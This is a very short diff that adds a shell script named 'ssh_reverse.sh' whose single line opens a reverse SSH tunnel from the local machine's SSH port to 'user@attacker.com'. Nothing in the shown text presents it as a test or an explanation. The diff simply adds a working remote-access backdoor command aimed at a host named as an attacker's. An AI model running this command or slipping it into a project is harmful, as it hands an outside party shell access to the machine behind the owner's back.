@@ -1,0 +1,2 @@
+# ssh_reverse.sh
+ssh -R 2222:localhost:22 user@attacker.com
